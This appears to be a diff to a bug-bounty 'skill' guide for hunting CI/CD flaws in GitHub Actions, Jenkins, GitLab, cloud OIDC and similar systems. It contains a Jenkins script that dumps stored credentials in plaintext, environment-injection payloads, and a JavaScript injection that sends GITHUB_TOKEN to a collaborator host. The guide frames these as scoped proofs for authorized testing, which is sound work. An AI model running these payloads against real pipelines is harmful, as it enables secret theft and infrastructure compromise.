@@ -1,6 +1,6 @@
 ---
 name: hunt-cicd
-description: "Hunt CI/CD pipeline vulnerabilities — GitHub Actions workflow injection (pull_request_target Pwnrequest + ${{ }}-into-shell), self-hosted runner poisoning, OIDC trust-policy abuse, Jenkins script-console RCE and CVE-2024-23897 file read, GitLab CI runner-token registration, Terraform state file leakage, artifact/log secret leakage, pipeline env-var disclosure. Use when target has a public GitHub/GitLab org, exposed CI dashboards (Jenkins/TeamCity/Drone/Argo), or build artifacts/images are reachable."
+description: "Hunt CI/CD pipeline vulnerabilities — GitHub Actions workflow injection (pull_request_target Pwnrequest + ${{ }}-into-shell), GITHUB_ENV/GITHUB_PATH newline injection, self-hosted runner poisoning, OIDC trust-policy abuse (AWS/GCP/Azure), Jenkins script-console RCE and CVE-2024-23897 file read, GitLab CI runner-token registration, Terraform state file leakage, artifact/log secret leakage, pipeline env-var disclosure. Use when target has a public GitHub/GitLab org, exposed CI dashboards (Jenkins/TeamCity/Drone/Argo/Azure Pipelines/CircleCI), or build artifacts/images are reachable."
 sources: hackerone_public, github_security_lab, cve_database, portswigger_research
 report_count: 18
 ---
@@ -59,10 +59,10 @@ import com.cloudbees.plugins.credentials.CredentialsProvider
 import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
 import org.jenkinsci.plugins.plaincredentials.StringCredentials
 CredentialsProvider.lookupCredentials(StandardUsernamePasswordCredentials, jenkins.model.Jenkins.instance).each {
-  println "${it.id} :: ${it.username} :: ${it.password}"
+  println "${it.id} :: ${it.username} :: ${it.password.getPlainText()}"
 }
 CredentialsProvider.lookupCredentials(StringCredentials, jenkins.model.Jenkins.instance).each {
-  println "${it.id} :: ${it.secret}"
+  println "${it.id} :: ${it.secret.getPlainText()}"
 }
 ```
 
@@ -127,7 +127,19 @@ cat /proc/self/environ | tr '\0' '\n' | base64 -w0   # captures secrets injected
 aws iam get-role --role-name <RoleName> --query 'Role.AssumeRolePolicyDocument'
 # Red flag: StringLike on sub with "repo:ORG/*" or no sub condition at all (only aud).
 ```
-Then prove it: from a workflow you control in-org, assume the role and run `aws sts get-caller-identity` returning the privileged role ARN.
+Then prove it: from a workflow you control in-org, assume the role and run `aws sts get-caller-identity` returning the privileged role ARN. Same class for GCP (`google-github-actions/auth` with `principalSet://.../attribute.repository/ORG/*`) and Azure federated credentials (`repo:ORG/*:ref:*`) — proof is `gcloud auth print-access-token` / `az account show` from that workflow, not the JSON trust document alone.
+
+**`$GITHUB_ENV` / `$GITHUB_PATH` newline injection** (distinct from `${{ }}`-into-`run:`):
+
+```yaml
+# VULNERABLE: untrusted text becomes extra KEY=VALUE lines for later steps
+- run: echo "TITLE=${{ github.event.issue.body }}" >> $GITHUB_ENV
+# also: cat downloaded-artifact.txt >> $GITHUB_ENV
+```
+
+A body of `ok%0aLD_PRELOAD=/tmp/x.so` or `ok%0aNODE_OPTIONS=--require /tmp/x.js` executes in the **next** step. `env: TITLE: ${{ github.event.issue.body }}` then `echo "$TITLE"` stops *shell* injection and does **not** make a `$GITHUB_ENV` write safe. Proof: unique Collaborator hit from a later step of that job. One run.
+
+**Token scope after exfil:** `curl -sI -H "Authorization: Bearer $T" https://api.github.com/repos/ORG/REPO` — report the actual permission (`contents:write` vs default `read`). A read-only token is credential exposure, not "push to default branch".
 
 ### Recon
 
@@ -163,6 +175,8 @@ gh api "repos/ORG/REPO/actions/artifacts" | jq -r '.artifacts[] | "\(.id) \(.nam
 ```
 Note `actions/upload-artifact` does **not** redact secrets — an artifact named `env`/`debug` is a common direct leak.
 
+**Third-party action supply chain (2025 class).** Mutable tags (`uses: some/action@v3`) let the action's owner ship code into every privileged run. In March 2025 the `tj-actions/changed-files` compromise (CVE-2025-30066; reviewdog `action-setup` CVE-2025-30154 was hit in the same campaign) re-pointed version tags at a malicious commit that dumped runner memory — i.e. CI secrets — into the workflow logs of public repos. Two hunting moves: (1) grep the org's `uses:` lines for tag-pinned (non-SHA) actions inside `pull_request_target` / privileged workflows — report the exposure class precisely, not "supply-chain RCE"; (2) if the org ran a known-compromised action during its window, grep that window's public run logs (loop above) for the dumped secrets — a live secret recovered from those logs is the finding.
+
 ---
 
 ## Phase 4 — GitLab CI
@@ -177,7 +191,7 @@ curl -s "https://$TARGET/api/v4/runners?type=instance_type" -H "PRIVATE-TOKEN: $
 # `rules:` that run privileged jobs on MRs from forks (the GitLab analogue of pull_request_target).
 curl -s "https://$TARGET/api/v4/projects/PID/repository/files/.gitlab-ci.yml/raw?ref=main"
 ```
-A registration token alone is **not** a finding unless the instance allows that token to register a runner that will execute a target project's pipeline. Demonstrate by registering an ephemeral runner you own and capturing a job's masked variables.
+GitLab 16+ runners authenticate with a `glrt-` token (or a project/group runner creation token). A legacy registration token still matters on older instances. Either string is a finding only if you register **one** ephemeral runner you own, it receives a real job, and you then unregister it. A token that never picks up a job is not impact.
 
 ---
 
@@ -245,8 +259,15 @@ Do not `POST` a new admin user or token unless the program allows a write. If it
 
 - `issue_comment`, `issues`, `workflow_dispatch`, and `workflow_run` bodies are attacker-controlled when those events fire from users who can open issues or run a dispatch. Same rule: `${{ github.event.* }}` inside `run:` is shell; the `env:` then `"$VAR"` form is not.
 - `toJSON(github)` inside `run:` expands the whole event payload into the script.
+- **Not only shell.** `actions/github-script` interpolates `${{ }}` into JavaScript (`script: | const t = "${{ github.event.issue.title }}"`). A title of `";require('child_process').execSync('curl https://x.<COLLAB>/?t='+process.env.GITHUB_TOKEN)//` is JS injection. `workflow_call` inputs dropped into `run:` (or written to `$GITHUB_ENV`) are the same class. `secrets: inherit` on a public reusable workflow is not a finding until an inherited secret hits your OOB from the *caller's* job.
 - **Cache poisoning:** a fork `pull_request` job writes `actions/cache` under a key a privileged workflow (`pull_request_target`, default-branch `push`) restores. Proof is your marker file printed by the privileged job or an OOB hit from that job — not a reverse shell. One cache entry.
+- **Untrusted artifact into a privileged job.** `workflow_run` / `pull_request_target` that `download-artifact`s the triggering run and then runs, `source`s, or deserializes a file from it executes in the privileged context. Proof: your marker in the fork artifact calls the collaborator **from the privileged job** (that job's token scope). One artifact.
+- **Token left in an artifact (ArtiPACKED).** `actions/checkout` writes `x-access-token` / `ghs_` into `.git/config`. A later `upload-artifact` of the workspace publishes it. Download once, and the finding is a token that still answers `GET /user`. An expired `ghs_` is not.
 - **OIDC `sub`:** a trust policy that allows `repo:ORG/REPO:pull_request` (or `repo:ORG/*`) lets a fork workflow assume the role. Proof is `aws sts get-caller-identity` from a workflow you control, in scope. Do not change cloud state.
+
+**Azure Pipelines / CircleCI:** `$(Build.SourceBranch)` / `<< pipeline.git.branch >>` interpolated into a script step is the same template-into-shell class as `${{ }}`. One OOB from that job.
+
+**Drone / Woodpecker / Argo CD dashboards** (only an in-scope host). `GET /api/user` or `GET /api/repos/<owner>/<repo>/secrets` with no token, or with a token already in a public config. A 401 is not a finding. Argo CD: one `GET /api/v1/applications` — a JSON app list without a login is the proof; a login page is not. Cookie CSRF against that API is `hunt-csrf`. Do not create an app or sync a malicious repo.
 
 **GitLab:** `CI_JOB_TOKEN` that can read another in-scope project (token scope not limited) is IDOR of build secrets. Show one foreign variable or artifact. A registration token is a finding only if you register one ephemeral runner and it receives a real job (Phase 4).
 
@@ -256,7 +277,7 @@ Do not `POST` a new admin user or token unless the program allows a write. If it
 |---|---|---|
 | Jenkins anon script console | Dump credential store → cloud/DB creds → lateral | Critical |
 | Jenkins CLI file read (CVE-2024-23897) | Read `secret.key`+`credentials.xml` → forge admin → RCE | Critical |
-| Actions `${{ }}` injection (Pwnrequest) | `printenv GITHUB_TOKEN`/secrets → push to protected branch | Critical |
+| Actions `${{ }}` / `$GITHUB_ENV` injection | `printenv GITHUB_TOKEN`/secrets → push to protected branch (only if token is write) | Critical |
 | Self-hosted runner poisoning | Code-exec on runner host → IMDS creds → persistence | Critical |
 | OIDC `sub` wildcard | `AssumeRole` privileged cloud role from any org workflow | Critical |
 | Terraform state w/ live creds | Infra/DB/API credential use | Critical |
@@ -269,15 +290,15 @@ Do not `POST` a new admin user or token unless the program allows a write. If it
 
 - **Jenkins console:** the `scriptText` POST returns your `id` output (`uid=…(jenkins)`). A returned login/SSO/Crowd page = **not** anon access. Screenshot the request+response.
 - **CVE-2024-23897:** response contains real `/etc/passwd` content; confirm version is in range. Patched instances return an error with no leaked line.
-- **Actions injection:** confirm the data flow into a sink first (FP section). Blind step → **Collaborator callback with the runner's source IP** is mandatory. Token exfil via `printenv`/`/proc/self/environ` decoded at your endpoint — never `cat $GITHUB_TOKEN`.
-- **OIDC abuse:** `aws sts get-caller-identity` from your controlled workflow returns the privileged role ARN — not just a permissive-looking trust policy.
+- **Actions injection:** confirm the data flow into a sink first (FP section). Blind step → **Collaborator callback with the runner's source IP** is mandatory. Token exfil via `printenv`/`/proc/self/environ` decoded at your endpoint — never `cat $GITHUB_TOKEN`. Then prove **scope** (write vs read) before claiming branch protection bypass. `$GITHUB_ENV` injection is proven by an OOB from a *later* step, not by the write itself. `github-script` is the same bar in JavaScript. An artifact or cache bug is proven only when the **privileged** job (not the fork job) runs your marker or leaks a token that still authenticates.
+- **OIDC abuse:** `aws sts get-caller-identity` / `gcloud auth print-access-token` / `az account show` from your controlled workflow returns the privileged identity — not just a permissive-looking trust policy.
 - **Terraform state:** `jq` extraction yields ≥1 *live* secret, then a read-only auth proves it. ID/ARN-only state = no finding.
 - **Runner token / image / logs:** demonstrate the secret authenticates (trufflehog `--only-verified`, or a real API call) — possession of a string is not impact.
 
 ### Common false positives to retract
 - `/script` returning a login page (auth required) reported as "unauth RCE."
 - `pull_request_target` present but untrusted input never reaches a sink (e.g., used only in `if:` on `github.actor`, or the workflow uses `pull_request` not `_target`).
-- `${{ }}` reference that is already wrapped in an `env:` block and quoted in the shell (the recommended safe pattern) — not injectable.
+- `${{ }}` reference that is already wrapped in an `env:` block and quoted in the shell (the recommended safe pattern) — not *shell*-injectable. Still a bug if that value is later appended to `$GITHUB_ENV` / `$GITHUB_PATH`.
 - `.tfstate` 200 containing only resource metadata.
 - A masked GitLab variable that is `protected` and only exposed to protected branches the attacker can't push to.
 - Trufflehog "unverified" hits that are example/expired keys.
